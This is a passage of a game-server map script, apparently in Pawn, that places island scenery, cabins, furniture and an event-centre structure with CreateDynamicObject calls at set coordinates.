	CreateDynamicObject(17031,2418.1999512,-3656.1000977,0.0000000,0.0000000,0.0000000,257.9992676); //object(cunt_rockgp2_13) (3)
	CreateDynamicObject(17031,2423.5996094,-3655.5996094,12.0000000,0.0000000,0.0000000,79.9914551); //object(cunt_rockgp2_13) (4)
	CreateDynamicObject(18228,2383.6000977,-3665.6999512,0.0000000,0.0000000,0.0000000,315.9921875); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(901,2435.6000977,-3662.6000977,28.0000000,0.0000000,0.0000000,121.9995117); //object(searock05) (4)
	CreateDynamicObject(901,2418.3000488,-3660.3999023,25.8999996,0.0000000,0.0000000,345.9976807); //object(searock05) (4)
	CreateDynamicObject(18228,2394.8000488,-3656.6999512,13.6000004,0.0000000,0.0000000,153.9887695); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(4842,2374.8994141,-3590.5996094,-2.4000001,0.0000000,0.0000000,283.9965820); //object(beach1_las0fg) (1)
	CreateDynamicObject(900,2420.8999023,-3552.3999023,8.1000004,0.0000000,0.0000000,49.9987793); //object(searock04) (1)
	CreateDynamicObject(900,2441.1000977,-3532.6999512,7.5999999,0.0000000,0.0000000,39.9987793); //object(searock04) (1)
	CreateDynamicObject(900,2456.0000000,-3515.0996094,6.6999998,0.0000000,0.0000000,9.9920654); //object(searock04) (1)
	CreateDynamicObject(900,2475.0996094,-3512.7998047,4.5999999,0.0000000,0.0000000,353.9904785); //object(searock04) (1)
	CreateDynamicObject(901,2361.3000488,-3641.3999023,0.9000000,0.0000000,0.0000000,231.9995117); //object(searock05) (4)
	CreateDynamicObject(901,2355.0000000,-3652.3000488,1.3000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2352.3999023,-3661.0000000,0.7000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2352.3999023,-3624.3999023,0.0000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2346.6000977,-3631.6000977,0.7000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2340.8000488,-3643.1999512,0.6000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2338.6000977,-3654.1999512,0.9000000,0.0000000,0.0000000,231.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2331.0000000,-3656.8000488,0.0000000,0.0000000,0.0000000,131.9982910); //object(searock05) (4)
	CreateDynamicObject(901,2319.1999512,-3651.5000000,0.0000000,0.0000000,0.0000000,131.9952393); //object(searock05) (4)
	CreateDynamicObject(901,2309.3000488,-3646.1000977,0.0000000,0.0000000,0.0000000,131.9952393); //object(searock05) (4)
	CreateDynamicObject(17067,2444.5000000,-3505.6999512,6.5000000,359.2500000,0.0000000,166.0000000); //object(cw2_logcabins) (1)
	CreateDynamicObject(18259,2330.5000000,-3622.5996094,3.5000000,0.0000000,0.0000000,239.9908447); //object(logcabinn01) (1)
	CreateDynamicObject(1637,2402.3999023,-3536.1000977,8.1999998,0.0000000,0.0000000,129.9954834); //object(od_pat_hutb) (1)
	CreateDynamicObject(1461,2403.8999023,-3535.6999512,7.6999998,0.0000000,0.0000000,229.9964600); //object(dyn_life_p) (1)
	CreateDynamicObject(11495,2608.6000977,-3405.5000000,1.2000000,1.2500000,0.0000000,0.0000000); //object(des_ranchjetty) (1)
	CreateDynamicObject(12990,2328.6999512,-3587.6999512,2.0000000,0.0000000,0.0000000,192.0000000); //object(sw_jetty) (1)
	CreateDynamicObject(2404,2467.3999023,-3482.8000488,8.0000000,0.0000000,0.0000000,178.0000000); //object(cj_surf_board) (1)
	CreateDynamicObject(2404,2443.6000977,-3502.8000488,8.0000000,0.0000000,0.0000000,177.9949951); //object(cj_surf_board) (2)
	CreateDynamicObject(2405,2451.0000000,-3496.0000000,8.0000000,0.0000000,0.0000000,190.0000000); //object(cj_surf_board2) (1)
	CreateDynamicObject(2405,2427.1000977,-3516.1999512,8.1000004,0.0000000,0.0000000,189.9975586); //object(cj_surf_board2) (2)
	CreateDynamicObject(2406,2434.6999512,-3509.1999512,8.1000004,0.0000000,0.0000000,190.0000000); //object(cj_surf_board3) (1)
	CreateDynamicObject(2406,2460.1000977,-3489.8000488,8.0000000,0.0000000,0.0000000,189.9975586); //object(cj_surf_board3) (2)
	CreateDynamicObject(2404,2459.3999023,-3489.5000000,8.0000000,0.0000000,0.0000000,177.9949951); //object(cj_surf_board) (3)
	CreateDynamicObject(2410,2471.6999512,-3483.1000977,6.9000001,0.0000000,0.0000000,0.0000000); //object(cj_surf_board4) (1)
	CreateDynamicObject(2410,2438.6999512,-3505.6999512,6.9000001,0.0000000,0.0000000,0.0000000); //object(cj_surf_board4) (2)
	CreateDynamicObject(1794,2335.3999023,-3626.0000000,3.5000000,0.0000000,0.0000000,152.7484131); //object(low_bed_3) (1)
	CreateDynamicObject(1828,2331.0000000,-3622.1000977,3.5999999,0.0000000,0.0000000,329.9963379); //object(man_sdr_rug) (2)
	CreateDynamicObject(2091,2336.6999512,-3620.8000488,3.5000000,0.0000000,0.0000000,329.9963379); //object(tv_ward_med_1) (1)
	CreateDynamicObject(2131,2322.6999512,-3619.1999512,3.5000000,0.0000000,0.0000000,59.9963379); //object(cj_kitch2_fridge) (1)
	CreateDynamicObject(2132,2321.6999512,-3620.8999023,3.5000000,0.0000000,0.0000000,59.9963379); //object(cj_kitch2_sink) (1)
	CreateDynamicObject(2132,2323.6999512,-3617.5000000,3.5000000,0.0000000,0.0000000,59.9908447); //object(cj_kitch2_sink) (2)
	CreateDynamicObject(2226,2337.3999023,-3621.6000977,5.5000000,0.0000000,0.0000000,301.9976807); //object(low_hi_fi_3) (1)
	CreateDynamicObject(2404,2331.3999023,-3618.0000000,4.8000002,0.0000000,0.0000000,0.0000000); //object(cj_surf_board) (4)
	CreateDynamicObject(2117,2325.8000488,-3620.3999023,3.5999999,0.0000000,0.0000000,331.9958496); //object(swank_dinning_5) (1)
	CreateDynamicObject(1720,2326.6000977,-3620.0000000,3.5999999,0.0000000,0.0000000,333.9953613); //object(rest_chair) (1)
	CreateDynamicObject(1720,2326.0000000,-3621.3000488,3.5000000,0.0000000,0.0000000,150.2435303); //object(rest_chair) (2)
	CreateDynamicObject(1720,2325.1000977,-3619.3999023,3.5999999,0.0000000,0.0000000,0.0000000); //object(rest_chair) (3)
	CreateDynamicObject(1720,2327.1999512,-3621.1000977,3.5000000,0.0000000,0.0000000,241.9958496); //object(rest_chair) (4)
	CreateDynamicObject(1649,2323.1000977,-3624.6000977,5.8000002,0.0000000,0.0000000,332.2500000); //object(wglasssmash) (1)
	CreateDynamicObject(18228,2404.8999023,-3738.1999512,0.0000000,0.0000000,0.0000000,332.9921875); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(18228,2412.8000488,-3700.1999512,0.0000000,0.0000000,0.0000000,60.0000000); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(13367,2506.0000000,-3532.6000977,37.7999992,0.0000000,0.0000000,0.0000000); //object(sw_watertower01) (1)
	CreateDynamicObject(900,2469.1999512,-3503.8999023,5.0000000,0.0000000,0.0000000,203.9904785); //object(searock04) (1)
	CreateDynamicObject(900,2485.3999023,-3487.3000488,4.1999998,342.0000000,180.0000000,247.9921875); //object(searock04) (1)
	CreateDynamicObject(900,2500.8000488,-3476.6999512,2.4000001,344.0021973,190.4018860,240.8868713); //object(searock04) (1)
	CreateDynamicObject(900,2520.8000488,-3467.1000977,2.7000000,343.9984131,190.3985596,230.8862305); //object(searock04) (1)
	CreateDynamicObject(900,2546.6999512,-3459.6000977,3.5000000,343.7803345,184.1514282,219.1492920); //object(searock04) (1)
	CreateDynamicObject(896,2570.8999023,-3454.0000000,-1.8000000,323.2500610,179.9931641,99.9927368); //object(searock06) (1)
	CreateDynamicObject(3171,2499.5000000,-3596.3999023,34.7999992,0.0000000,6.0000000,0.0000000); //object(trailer5_01) (1)
	CreateDynamicObject(3172,2495.6000977,-3586.8999023,34.7999992,10.5000000,0.0000000,82.0000000); //object(trailer6_01) (1)
	CreateDynamicObject(3175,2475.3999023,-3588.8999023,38.5999985,0.0000000,0.0000000,0.0000000); //object(sm_airstrm_med_) (1)
	CreateDynamicObject(3175,2484.5000000,-3607.3000488,37.0999985,357.0018311,2.0027466,268.1047974); //object(sm_airstrm_med_) (2)
	CreateDynamicObject(2405,2490.6999512,-3587.8000488,37.0999985,0.0000000,0.0000000,0.0000000); //object(cj_surf_board2) (3)
	CreateDynamicObject(2404,2490.1000977,-3587.6000977,37.2999992,0.0000000,0.0000000,0.0000000); //object(cj_surf_board) (5)
	CreateDynamicObject(1439,2498.5000000,-3607.6999512,36.0000000,0.0000000,0.0000000,268.0000000); //object(dyn_dumpster_1) (1)
	CreateDynamicObject(1255,2488.0000000,-3603.8999023,37.4000015,0.0000000,0.0000000,91.9951477); //object(lounger) (1)
	CreateDynamicObject(1255,2483.1999512,-3603.3999023,38.0000000,0.0000000,0.0000000,91.9940186); //object(lounger) (1)
	CreateDynamicObject(1255,2495.0000000,-3591.5000000,35.5000000,0.0000000,0.0000000,205.9940186); //object(lounger) (1)
	CreateDynamicObject(1255,2495.6000977,-3592.8000488,35.5000000,0.0000000,0.0000000,205.9936523); //object(lounger) (1)
	CreateDynamicObject(1370,2475.6999512,-3583.6000977,39.5000000,0.0000000,0.0000000,0.0000000); //object(cj_flame_drum) (1)
	CreateDynamicObject(1370,2498.1000977,-3606.5000000,36.5000000,0.0000000,0.0000000,0.0000000); //object(cj_flame_drum) (2)
	CreateDynamicObject(12957,2483.3000488,-3583.6000977,38.2000008,13.5000000,0.0000000,54.0000000); //object(sw_pickupwreck01) (1)
	CreateDynamicObject(1432,2491.6999512,-3598.8999023,36.0999985,358.2766113,10.0045776,0.3039856); //object(dyn_table_2) (1)
	CreateDynamicObject(1432,2484.3999023,-3596.8999023,36.9000015,358.2751465,10.0030518,0.3021240); //object(dyn_table_2) (2)
	CreateDynamicObject(9241,2406.8000488,-3629.0000000,28.8999996,0.0000000,0.0000000,180.0000000); //object(copbits_sfn) (1)
	CreateDynamicObject(3666,2418.8999023,-3640.3999023,30.2000008,0.0000000,0.0000000,0.0000000); //object(airuntest_las) (1)
	CreateDynamicObject(3666,2418.3999023,-3617.0000000,30.2000008,0.0000000,0.0000000,0.0000000); //object(airuntest_las) (2)
	CreateDynamicObject(3666,2394.8999023,-3616.8999023,30.2000008,0.0000000,0.0000000,0.0000000); //object(airuntest_las) (3)
	CreateDynamicObject(3666,2394.5000000,-3640.3000488,30.2000008,0.0000000,0.0000000,0.0000000); //object(airuntest_las) (4)
	CreateDynamicObject(900,2393.3999023,-3632.3999023,24.5000000,0.0000000,0.0000000,264.7421265); //object(searock04) (1)
	CreateDynamicObject(900,2405.8999023,-3617.3000488,24.0000000,0.0000000,0.0000000,336.7375488); //object(searock04) (1)
	CreateDynamicObject(900,2406.3000488,-3643.8999023,24.7999992,0.0000000,0.0000000,334.7375488); //object(searock04) (1)
	CreateDynamicObject(770,2569.3000488,-3529.0000000,0.6000000,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (2)
	CreateDynamicObject(770,2578.8000488,-3623.3999023,14.3999996,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (2)
	CreateDynamicObject(770,2585.1999512,-3595.8000488,12.1000004,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (2)
	CreateDynamicObject(768,2555.3999023,-3639.6000977,17.6000004,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (1)
	CreateDynamicObject(715,2557.8999023,-3586.8999023,14.1000004,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (2)
	CreateDynamicObject(889,2559.6999512,-3540.1999512,0.5000000,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (4)
	CreateDynamicObject(889,2588.6000977,-3550.6000977,7.6999998,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (4)
	CreateDynamicObject(889,2594.6000977,-3576.3999023,12.3999996,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (4)
	CreateDynamicObject(889,2545.8000488,-3597.3000488,6.4000001,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (4)
	CreateDynamicObject(768,2421.6000977,-3567.1999512,27.1000004,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (3)
	CreateDynamicObject(768,2472.6000977,-3555.1999512,32.5999985,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (3)
	CreateDynamicObject(770,2475.0000000,-3615.5000000,37.2000008,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (5)
	CreateDynamicObject(770,2453.8999023,-3574.0000000,36.5000000,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (5)
	CreateDynamicObject(770,2517.6999512,-3575.1000977,28.0000000,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (5)
	CreateDynamicObject(715,2449.8999023,-3554.8000488,37.7999992,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (2)
	CreateDynamicObject(715,2441.1000977,-3643.0000000,38.2999992,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (2)
	CreateDynamicObject(715,2494.0000000,-3533.3999023,36.7000008,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (2)
	CreateDynamicObject(736,2423.6999512,-3605.3999023,40.9000015,0.0000000,0.0000000,0.0000000); //object(ceasertree01_lvs) (3)
	CreateDynamicObject(736,2510.1000977,-3554.3000488,37.5999985,0.0000000,0.0000000,0.0000000); //object(ceasertree01_lvs) (3)
	CreateDynamicObject(770,2445.5000000,-3594.1000977,34.2999992,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (2)
	//CENTRO DE EVENTOS
	CreateDynamicObject(10991,-262.8300000,1512.2000000,68.6300000,0.0000000,0.0000000,-47.2200000); //
	CreateDynamicObject(3406,-241.8800000,1527.2800000,83.0000000,0.0000000,0.0000000,68.1600000); //
	CreateDynamicObject(3406,-246.1600000,1520.6200000,83.0000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-252.6400000,1514.6100000,83.0000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-278.3400000,1492.7100000,83.0000000,0.0000000,0.0000000,20.1000000); //
	CreateDynamicObject(3406,-271.4100000,1497.1800000,83.0000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-265.0500000,1503.1400000,83.0000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-241.8800000,1527.2800000,90.8400000,0.0000000,0.0000000,68.1600000); //
	CreateDynamicObject(3406,-246.1600000,1520.6200000,90.8600000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-252.6400000,1514.6100000,90.9000000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-265.0500000,1503.1400000,90.9400000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-271.4100000,1497.1800000,90.8500000,0.0000000,0.0000000,42.7800000); //
	CreateDynamicObject(3406,-278.3400000,1492.7100000,90.8400000,0.0000000,0.0000000,20.1000000); //
	CreateDynamicObject(3406,-265.8800000,1504.1100000,94.0600000,91.2600000,15.3600000,25.9800000); //
	CreateDynamicObject(3406,-274.5200000,1512.2800000,94.0600000,91.2600000,15.3600000,-153.9600000); //
	CreateDynamicObject(3406,-261.8700000,1523.7600000,94.0600000,91.2600000,15.3600000,-153.9600000); //
	CreateDynamicObject(3406,-253.2500000,1515.5200000,94.0600000,91.2600000,15.3600000,25.9800000); //
	CreateDynamicObject(19146,-266.0800000,1522.7900000,93.0200000,0.0000000,0.0000000,86.2200000); //
	CreateDynamicObject(19146,-264.4800000,1524.1900000,93.0200000,0.0000000,0.0000000,51.9000000); //
	CreateDynamicObject(19146,-262.9100000,1525.7300000,93.0200000,0.0000000,0.0000000,48.9000000); //
	CreateDynamicObject(19146,-261.2100000,1527.1100000,93.0200000,0.0000000,0.0000000,48.9000000); //
	CreateDynamicObject(19146,-259.5000000,1528.5300000,93.0200000,0.0000000,0.0000000,39.8400000); //
	CreateDynamicObject(3406,-255.3100000,1529.5300000,94.0600000,91.2600000,15.3600000,-153.9600000); //
	CreateDynamicObject(3406,-246.8200000,1521.1400000,94.0600000,91.2600000,15.3600000,26.5800000); //
	CreateDynamicObject(3406,-242.8600000,1528.0300000,94.0600000,91.2600000,15.3600000,50.8200000); //
	CreateDynamicObject(3406,-252.2300000,1531.1900000,94.0600000,91.2600000,15.3600000,229.2000000); //
	CreateDynamicObject(3406,-252.2300000,1531.1900000,94.0600000,91.2600000,15.3600000,229.2000000); //
	CreateDynamicObject(19146,-257.9800000,1530.0100000,93.0200000,0.0000000,0.0000000,39.8400000); //
	CreateDynamicObject(19146,-256.3300000,1531.4800000,93.0200000,0.0000000,0.0000000,39.8400000); //
	CreateDynamicObject(19146,-254.7300000,1532.8600000,93.0200000,0.0000000,0.0000000,39.8400000); //
	CreateDynamicObject(19146,-252.9900000,1534.5200000,93.0200000,0.0000000,0.0000000,67.6200000); //
	CreateDynamicObject(19146,-251.9300000,1536.4700000,93.0200000,0.0000000,0.0000000,12.9600000); //
	CreateDynamicObject(3406,-280.9200000,1506.6600000,94.0600000,91.2600000,15.3600000,-153.9600000); //
	CreateDynamicObject(3406,-272.4800000,1498.3800000,94.0600000,91.2600000,15.3600000,25.9800000); //
	CreateDynamicObject(3406,-279.2800000,1494.1400000,94.0600000,91.2600000,15.3600000,6.1200000); //
	CreateDynamicObject(3406,-284.4000000,1504.7000000,94.0600000,91.2600000,15.3600000,-174.9600000); //
	CreateDynamicObject(19146,-272.2000000,1517.0400000,93.0200000,0.0000000,0.0000000,16.2000000); //
	CreateDynamicObject(19146,-273.9100000,1515.6500000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-275.5500000,1514.2400000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-277.2100000,1512.7800000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-278.5800000,1511.4000000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-280.2800000,1510.0400000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-281.9300000,1508.6500000,93.0200000,0.0000000,0.0000000,42.2400000); //
	CreateDynamicObject(19146,-284.6700000,1506.8700000,93.0200000,0.0000000,0.0000000,21.6000000); //
	CreateDynamicObject(19146,-286.7200000,1506.1100000,93.0200000,0.0000000,0.0000000,21.6000000); //
	CreateDynamicObject(19146,-288.7300000,1505.2600000,93.0200000,0.0000000,0.0000000,51.1800000); //
	CreateDynamicObject(1893,-242.7900000,1530.1500000,93.0600000,0.0000000,0.0000000,64.9200000); //
	CreateDynamicObject(1893,-248.5700000,1521.0600000,93.0600000,0.0000000,0.0000000,45.6600000); //
	CreateDynamicObject(1893,-273.9200000,1497.7200000,93.0600000,0.0000000,0.0000000,45.6600000); //
	CreateDynamicObject(1893,-283.0300000,1494.0900000,93.0600000,0.0000000,0.0000000,14.1600000); //
	CreateDynamicObject(18653,-250.3100000,1541.5000000,76.5500000,0.0000000,0.0000000,-101.3400000); //
	CreateDynamicObject(18653,-257.3100000,1535.2200000,76.5500000,0.0000000,0.0000000,-49.0800000); //
	CreateDynamicObject(18653,-264.8400000,1528.3600000,76.5500000,0.0000000,0.0000000,-49.0800000); //
	CreateDynamicObject(18653,-279.3000000,1515.0300000,76.5500000,0.0000000,0.0000000,-49.0800000); //
	CreateDynamicObject(18653,-287.3400000,1507.7000000,76.5500000,0.0000000,0.0000000,-49.0800000); //
	CreateDynamicObject(18653,-293.1000000,1501.9500000,76.5500000,0.0000000,0.0000000,-14.7600000); //
	CreateDynamicObject(3526,-254.4500000,1537.8900000,76.9900000,0.0000000,0.0000000,-46.7400000); //
	CreateDynamicObject(3526,-263.0000000,1529.9500000,76.9900000,0.0000000,0.0000000,-46.7400000); //
	CreateDynamicObject(3526,-274.2000000,1519.5400000,76.9900000,0.0000000,0.0000000,-47.4600000); //
	CreateDynamicObject(3526,-280.4800000,1513.9100000,76.9900000,0.0000000,0.0000000,-47.4600000); //
	CreateDynamicObject(3526,-289.4900000,1505.6100000,76.9900000,0.0000000,0.0000000,-47.4600000); //
	CreateDynamicObject(4731,-260.6400000,1509.0200000,89.9300000,0.0000000,0.0000000,-106.9800000); //
	CreateDynamicObject(3406,-260.1600000,1510.1300000,94.0600000,91.2600000,15.3600000,25.9800000); //
	CreateDynamicObject(3406,-268.2900000,1518.1200000,94.0600000,91.2600000,15.3600000,-153.1200000); //
	CreateDynamicObject(3864,-247.8600000,1543.2700000,80.5200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3864,-292.6500000,1498.5000000,80.5200000,0.0000000,0.0000000,-81.8400000); //
	CreateDynamicObject(16322,-253.8500000,1502.0300000,80.9100000,0.0000000,0.0000000,42.3600000); //
	CreateDynamicObject(3031,-251.0000000,1504.3700000,81.6300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3386,-251.2200000,1504.0000000,76.8400000,0.0000000,0.0000000,-48.1200000); //
	CreateDynamicObject(3388,-251.9400000,1503.3600000,76.8300000,0.0000000,0.0000000,-49.3200000); //
	CreateDynamicObject(3389,-252.6700000,1502.7200000,76.8300000,0.0000000,0.0000000,-48.3000000); //
	CreateDynamicObject(3388,-254.0700000,1501.5200000,76.8300000,0.0000000,0.0000000,-49.3200000); //
	CreateDynamicObject(3386,-253.4000000,1502.1200000,76.8400000,0.0000000,0.0000000,-48.6600000); //
	CreateDynamicObject(3389,-254.8200000,1500.9700000,76.8300000,0.0000000,0.0000000,-48.8400000); //
	CreateDynamicObject(3388,-255.5400000,1500.2300000,76.8300000,0.0000000,0.0000000,-49.3200000); //
	CreateDynamicObject(3389,-256.2100000,1499.6200000,76.8300000,0.0000000,0.0000000,-48.8400000); //
	CreateDynamicObject(921,-256.8500000,1500.3700000,80.1300000,0.0000000,0.0000000,212.8200000); //
	CreateDynamicObject(921,-255.2500000,1501.7000000,80.1300000,0.0000000,0.0000000,212.8200000); //
	CreateDynamicObject(921,-253.2400000,1503.5300000,80.1300000,0.0000000,0.0000000,212.8200000); //
	CreateDynamicObject(16365,-238.7500000,1519.4400000,79.9300000,0.0000000,0.0000000,-45.6600000); //
	CreateDynamicObject(920,-247.8700000,1517.2100000,77.3300000,0.0000000,0.0000000,42.9000000); //
	CreateDynamicObject(920,-248.8800000,1516.2900000,77.3300000,0.0000000,0.0000000,42.9000000); //
	CreateDynamicObject(2977,-246.2900000,1518.0500000,76.7500000,0.0000000,0.0000000,-45.8400000); //
	CreateDynamicObject(2977,-244.2400000,1519.2000000,76.7500000,0.0000000,0.0000000,29.5800000); //
	CreateDynamicObject(19317,-253.0900000,1512.5900000,77.6600000,0.3000000,-11.4000000,-47.3400000); //
	CreateDynamicObject(19317,-252.5300000,1513.1000000,77.6600000,0.3000000,-11.4000000,-47.3400000); //
	CreateDynamicObject(19317,-251.8900000,1513.7200000,77.6600000,0.3000000,-11.4000000,-47.3400000); //
	CreateDynamicObject(19317,-251.2800000,1514.3000000,77.6600000,0.3000000,-11.4000000,-47.3400000); //
	CreateDynamicObject(933,-241.3200000,1516.7400000,76.8100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(933,-238.2300000,1519.7400000,76.8100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19319,-253.5600000,1512.1000000,77.6300000,5.5800000,-11.9400000,-54.0000000); //
	CreateDynamicObject(19319,-254.2000000,1511.6600000,77.6300000,5.5800000,-11.9400000,-54.0000000); //
	CreateDynamicObject(19319,-254.7500000,1511.1000000,77.6300000,5.5800000,-11.9400000,-51.6000000); //
	CreateDynamicObject(19319,-255.3000000,1510.5900000,77.6300000,5.5800000,-11.9400000,-54.0000000); //
	CreateDynamicObject(18102,-256.8700000,1509.5100000,82.8400000,32.3400000,-7.4400000,42.6600000); //
	CreateDynamicObject(2593,-250.5000000,1504.7300000,77.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19421,-250.4600000,1504.9700000,77.2400000,90.4800000,-41.2200000,32.4600000); //
	CreateDynamicObject(19421,-250.7000000,1504.8000000,77.2400000,90.4800000,-41.2200000,-35.4600000); //
	CreateDynamicObject(19421,-250.2400000,1504.7700000,77.6400000,90.4800000,-41.2200000,-35.4600000); //
	CreateDynamicObject(19421,-250.4700000,1504.9300000,77.9900000,90.4800000,-41.2200000,33.3000000); //
	CreateDynamicObject(19421,-250.4900000,1504.5900000,77.9900000,90.4800000,-41.2200000,33.3000000); //
	CreateDynamicObject(3393,-259.5000000,1497.2600000,76.8100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3391,-262.6600000,1493.7200000,76.7900000,0.0000000,0.0000000,-42.4800000); //
	CreateDynamicObject(3390,-268.1700000,1498.0000000,76.8000000,0.0000000,0.0000000,-227.4000000); //
	CreateDynamicObject(2606,-268.4600000,1498.2400000,78.7100000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(2606,-268.4600000,1498.2400000,79.1300000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(2606,-268.4600000,1498.2400000,79.5900000,0.0000000,0.0000000,43.0200000); //
	CreateDynamicObject(1839,-261.9200000,1494.6600000,77.7000000,0.0000000,0.0000000,-14.2200000); //
	CreateDynamicObject(1788,-262.1400000,1493.9200000,77.7700000,0.0000000,0.0000000,47.8200000); //
	CreateDynamicObject(1788,-262.1400000,1493.9200000,77.9100000,0.0000000,0.0000000,47.8200000); //
	CreateDynamicObject(1788,-262.1400000,1493.9200000,78.0400000,0.0000000,0.0000000,47.8200000); //
	CreateDynamicObject(1788,-263.5800000,1493.2400000,77.7300000,0.0000000,0.0000000,216.8400000); //
	CreateDynamicObject(1788,-263.5800000,1493.2400000,77.8600000,0.0000000,0.0000000,216.8400000); //
	CreateDynamicObject(1958,-259.7400000,1497.5800000,77.6900000,0.0000000,0.0000000,58.9800000); //
	CreateDynamicObject(1958,-259.8600000,1496.3900000,77.6900000,0.0000000,0.0000000,84.0000000); //
	CreateDynamicObject(1958,-262.6500000,1494.2900000,77.6900000,0.0000000,0.0000000,47.5800000); //
	CreateDynamicObject(1958,-263.1600000,1493.8000000,77.6900000,0.0000000,0.0000000,-42.2400000); //
	CreateDynamicObject(936,-262.6000000,1503.0300000,77.3400000,0.0000000,0.0000000,41.7600000); //
	CreateDynamicObject(936,-264.2500000,1501.5600000,77.3400000,0.0000000,0.0000000,41.7600000); //
	CreateDynamicObject(1893,-265.0100000,1501.4500000,79.9700000,0.0000000,0.0000000,39.4200000); //
	CreateDynamicObject(1893,-263.2000000,1503.0600000,79.9700000,0.0000000,0.0000000,39.4200000); //
	CreateDynamicObject(19319,-262.6300000,1503.0000000,77.8200000,-91.3200000,-33.0600000,86.7600000); //
	CreateDynamicObject(19317,-264.4200000,1501.5800000,77.8300000,-90.4800000,71.5800000,-139.4400000); //
	CreateDynamicObject(18644,-263.0400000,1502.3800000,77.8400000,5.7000000,-89.5200000,-36.8400000); //
	CreateDynamicObject(18635,-262.3200000,1503.6300000,77.8700000,-89.5800000,58.6200000,164.4600000); //
	CreateDynamicObject(18635,-263.6000000,1501.7400000,77.8700000,-89.5800000,58.6200000,77.3400000); //
	CreateDynamicObject(18644,-265.0600000,1501.4500000,77.8400000,5.7000000,-89.5200000,-36.8400000); //
	CreateDynamicObject(1486,-263.4900000,1502.8200000,77.9400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1486,-263.2600000,1502.9400000,77.9400000,0.0000000,0.0000000,-0.0600000); //
	CreateDynamicObject(1805,-262.0100000,1502.3900000,77.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1805,-263.7400000,1500.7800000,77.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14679,-261.9100000,1504.5700000,77.3200000,0.0000000,0.0000000,-20.3400000); //
	CreateDynamicObject(1789,-265.5700000,1500.4200000,77.3800000,0.0000000,0.0000000,44.8200000); //
	CreateDynamicObject(3031,-274.7800000,1482.7800000,78.3700000,0.0000000,0.0000000,-83.7000000); //
	CreateDynamicObject(2669,-276.9600000,1488.8700000,78.1900000,0.0000000,0.0000000,107.7600000); //
	CreateDynamicObject(2232,-278.8200000,1487.3300000,77.5200000,0.0000000,0.0000000,106.8000000); //
	CreateDynamicObject(2232,-279.0700000,1487.9700000,77.5200000,0.0000000,0.0000000,106.8000000); //
	CreateDynamicObject(2232,-279.1800000,1489.1900000,77.5200000,0.0000000,0.0000000,81.4800000); //
	CreateDynamicObject(2232,-277.6000000,1487.7000000,77.5200000,0.0000000,0.0000000,134.7600000); //
	CreateDynamicObject(2232,-278.0000000,1489.3800000,77.5200000,0.0000000,0.0000000,80.8200000); //
	CreateDynamicObject(2229,-278.0800000,1488.7200000,76.7300000,0.0000000,0.0000000,123.0600000); //
	CreateDynamicObject(2229,-276.7700000,1488.0100000,76.7300000,0.0000000,0.0000000,151.1400000); //
	CreateDynamicObject(2229,-277.1500000,1490.0500000,76.7300000,0.0000000,0.0000000,83.9400000); //
	CreateDynamicObject(2232,-275.4800000,1488.3000000,77.5200000,0.0000000,0.0000000,158.7600000); //
	CreateDynamicObject(2229,-276.9000000,1489.1200000,76.7300000,0.0000000,0.0000000,105.0600000); //
	CreateDynamicObject(2229,-276.8700000,1489.6200000,76.7300000,0.0000000,0.0000000,88.7400000); //
	CreateDynamicObject(2229,-276.3700000,1490.6600000,76.7300000,0.0000000,0.0000000,84.0600000); //
	CreateDynamicObject(2669,-275.3500000,1485.5900000,78.1900000,0.0000000,0.0000000,110.7600000); //
